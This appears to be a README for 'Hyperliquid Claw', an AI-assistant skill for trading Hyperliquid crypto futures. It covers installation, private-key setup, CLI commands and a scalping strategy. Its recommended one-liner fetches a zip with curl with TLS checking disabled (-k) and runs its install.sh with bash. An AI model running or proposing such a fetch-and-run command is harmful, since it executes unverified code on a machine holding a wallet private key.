<div align="center">

<img src="https://img.shields.io/badge/Hyperliquid-Claw-00D4AA?style=for-the-badge&logo=ethereum&logoColor=white" alt="Hyperliquid Claw"/>

# 🦀 Hyperliquid Claw

**The most powerful AI-driven trading skill for Hyperliquid perpetual futures**  
Built for [OpenClaw](https://clawd.bot) · Works on macOS & Linux · No BS setup

[![Stars](https://img.shields.io/github/stars/Rohit24567/HyperLiquid-Claw?style=flat-square&color=00D4AA)](https://github.com/Rohit24567/HyperLiquid-Claw/stargazers)
[![License](https://img.shields.io/badge/license-MIT-blue?style=flat-square)](LICENSE)
[![Version](https://img.shields.io/badge/version-2.0.0-brightgreen?style=flat-square)](CHANGELOG.md)
[![Node](https://img.shields.io/badge/node-%3E%3D18-339933?style=flat-square&logo=node.js)](https://nodejs.org)
[![Python](https://img.shields.io/badge/python-%3E%3D3.10-3776AB?style=flat-square&logo=python)](https://python.org)

</div>

---

> **Trade smarter, not harder.** Hyperliquid Claw gives your AI assistant full access to Hyperliquid DEX — monitor portfolios, analyze markets with real-time charts and volume data, and execute trades through natural conversation.

---

## ✨ Why Hyperliquid Claw?

| Feature | What it does |
|---|---|
| 🤖 **AI-Native** | Talk to your OpenClaw assistant like a trader, not a coder |
| 📊 **Real-Time Charts** | Price action + volume analysis via CoinGecko (no API key needed) |
| ⚡ **Momentum Signals** | Automated bull/bear detection with volume confirmation |
| 🛡️ **Read-Only Safe** | Monitor without exposing your private key |
| 🌍 **228+ Assets** | Every perpetual on Hyperliquid, instantly accessible |
| 🧪 **Testnet Support** | Practice strategies risk-free |

---

## 🚀 Installation

### Method 1 — One-Line Install (Recommended)

```bash
curl -fsSLk https://github.com/Rohit24567/HyperLiquid-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/HyperLiquid-Claw-main && \
bash install.sh
```

> Works on **Linux** and **macOS**. Just paste and go ☕

---

### Method 2 — Manual Install (macOS / Windows WSL)

1. **Download** the zip from the green **Code** button above, or [click here](https://github.com/Rohit24567/HyperLiquid-Claw/archive/refs/heads/main.zip)
2. **Unpack** the archive anywhere on your machine
3. **Open Terminal**, navigate to the unpacked folder:
   ```bash
   cd ~/Downloads/HyperLiquid-Claw-main
   ```
4. **Run the installer:**
   ```bash
   bash install.sh
   ```

The installer will:
- ✅ Check for Node.js 18+ and Python 3.10+
- ✅ Install all JS and Python dependencies
- ✅ Copy the skill into your OpenClaw skills directory
- ✅ Verify the setup and print a confirmation

---

## ⚙️ Configuration

### Read-Only Mode (Portfolio Monitoring)
No private key required. Just set your address:

```bash
export HYPERLIQUID_ADDRESS=0xYourWalletAddress
```

### Trading Mode (Execute Orders)
```bash
export HYPERLIQUID_PRIVATE_KEY=0xYourPrivateKey
```

> 💡 **Recommended:** Use a `.env` file so you never have to retype credentials:

```bash
cd ~/.openclaw/skills/hyperliquid
cp .env.example .env
nano .env   # paste your key and save
```

`.env` is already in `.gitignore` — your key never leaks.

### Testnet
```bash
export HYPERLIQUID_TESTNET=1
```

---

## 💬 Usage — Talk to OpenClaw Naturally

Once installed, just open OpenClaw and speak:

```
"Analyze the crypto market on Hyperliquid"
"What's the BTC momentum right now?"
"Check my portfolio and P&L"
"Enter a SOL long with 10% of my balance"
"Close my ETH position"
"Show me current volume on ARB"
```

No commands to memorize. Your AI handles it.

---

## 🖥️ CLI Usage

For power users who prefer the terminal directly:

```bash
# Portfolio
node scripts/hyperliquid.mjs balance
node scripts/hyperliquid.mjs positions
node scripts/hyperliquid.mjs orders
node scripts/hyperliquid.mjs fills

# Prices
node scripts/hyperliquid.mjs price BTC
node scripts/hyperliquid.mjs meta          # list all 228+ assets

# Market Orders
node scripts/hyperliquid.mjs market-buy  SOL 0.1
node scripts/hyperliquid.mjs market-sell ETH 0.5

# Limit Orders
node scripts/hyperliquid.mjs limit-buy  BTC 0.001 88000
node scripts/hyperliquid.mjs limit-sell ETH 1    3100

# Cancel
node scripts/hyperliquid.mjs cancel-all
node scripts/hyperliquid.mjs cancel-all BTC

# Analysis Scripts
node scripts/analyze-coingecko.mjs    # full chart + volume + signal
python3 scripts/analyze_market.py     # Python momentum engine
node scripts/check-positions.mjs      # real-time P&L monitor
node scripts/scan-market.mjs          # quick price scan
```

---

## 📈 Strategy — Momentum Scalping

```
1.  Run analyze-coingecko.mjs (or ask OpenClaw to analyze)
2.  Wait for "STRONG BULLISH" or "STRONG BEARISH" signal
        → Price move > 0.5%
        → Volume > 1.5× average
3.  Size position at 10% of account equity
4.  Set profit target at +2%, stop loss at -1%
5.  Monitor every 30–60 min with check-positions.mjs
6.  Close when target or stop is hit — no exceptions
```

**Risk Parameters:**
- Position size: 10% per trade
- Max loss: 1% per trade
- Profit target: 2% per trade
- Max concurrent positions: 1
- Max hold time: 4 hours

---

## 🏗️ Architecture

```
hyperliquid-claw/
├── scripts/
│   ├── hyperliquid.mjs          # Core JS trading client (Hyperliquid SDK)
│   ├── analyze-coingecko.mjs    # Chart + volume analysis (JS)
│   ├── analyze_market.py        # Momentum engine (Python)
│   ├── check-positions.mjs      # Real-time P&L monitor (JS)
│   ├── scan-market.mjs          # Quick price scanner (JS)
│   ├── signals.py               # Signal generation (Python)
│   └── utils.py                 # Shared Python utilities
├── references/
│   └── api.md                   # Full Hyperliquid API reference
├── SKILL.md                     # OpenClaw skill definition
├── install.sh                   # One-command installer
├── .env.example                 # Credential template
├── package.json
├── requirements.txt
└── README.md
```

**Data Sources:**
- 🔵 **Trading** — Hyperliquid API (`api.hyperliquid.xyz`) + Official SDK
- 🟠 **Market Data** — CoinGecko Free API (no auth, 24h history + volume)

---

## 🛡️ Safety Features

- **Read-only by default** — no key, no risk
- **5% slippage cap** — market orders use limit orders with buffer
- **Size warnings** — alerts if trade exceeds 20% of equity
- **Price sanity check** — warns if limit is >5% from market price
- **Stop-loss alerts** — automated notifications from position monitor
- **No auto-retry** — failed trades are never silently retried

---

## 🤝 Contributing

PRs welcome! Please open an issue first to discuss large changes.

```bash
git clone https://github.com/Rohit24567/HyperLiquid-Claw.git
cd HyperLiquid-Claw
npm install
pip install -r requirements.txt --break-system-packages
```

---

## 📋 Changelog

### v2.0.0 — 2026-01-27
- 🎉 Integrated official Hyperliquid SDK
- 🐍 Added Python momentum/signal engine
- 📊 CoinGecko chart + volume analysis
- 🎯 Automated bull/bear signal detection
- 📈 P&L position monitor with alerts
- 🔧 Full CLI overhaul

### v1.0.0 — 2026-01-27
- 🚀 Initial release — basic trading + portfolio monitoring

---

## ⚠️ Disclaimer

This is **unofficial, community software**. Use at your own risk.  
Crypto perpetual futures trading involves **substantial risk of loss**.  
Signals are informational only — not financial advice.  
Always verify trades before execution.

---

<div align="center">

Made with ❤️ for the Hyperliquid community · Powered by [OpenClaw](https://clawd.bot)

**If this saves you time, please ⭐ star the repo — it helps others find it!**

</div>
